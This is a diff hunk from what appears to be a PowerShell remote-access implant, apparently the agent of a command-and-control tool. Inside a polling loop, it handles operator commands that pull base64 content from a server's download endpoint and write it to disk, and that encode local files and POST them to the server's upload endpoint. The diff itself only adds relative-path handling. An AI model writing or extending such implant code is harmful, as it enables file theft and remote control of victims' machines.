@@ -63,12 +63,14 @@ while ($true) {
 
    if ($invoke64 -like "upload*") {
       $file_path = $invoke64.toString().Split("!")[1] ; $invoke64 = $null
+      if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
       $download = $($file_content = Invoke-WebRequest -UserAgent $userAgent -UseBasicParsing $server/api/download -Method Get) 2>&1> $null
       $file_content = R64Decoder -f $file_content.ToString().Split(" ")[-1]
       [IO.File]::WriteAllBytes("$file_path", $file_content)}
 
    if ($invoke64 -like "download*") {
       $file_path = $invoke64.toString().Split(" ",2)[1].Split("!")[0] ; $invoke64 = $null
+      if ($file_path -notlike "*:*") { $file_path = [string]$pwd + "\" + [string]$file_path }
       $file_content = R64Encoder -f "$file_path"
       $upload = $(Invoke-WebRequest -UserAgent $userAgent -UseBasicParsing $server/api/upload -Method Post -Body "File: $file_content") 2>&1> $null }
 
